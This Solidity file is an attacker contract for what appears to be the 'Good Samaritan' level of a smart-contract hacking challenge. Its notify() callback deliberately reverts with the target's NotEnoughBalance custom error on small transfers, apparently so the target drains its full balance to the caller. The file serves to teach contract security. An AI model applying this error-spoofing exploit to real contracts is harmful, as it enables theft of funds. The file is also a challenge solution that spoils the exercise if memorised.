// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {GoodSamaritan, INotifyable} from "../contracts/27_GoodSamaritan.sol";

contract GoodSamaritanAttacker is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan private goodSamaritan;

    constructor(address _goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(_goodSamaritanAddress);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external override {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
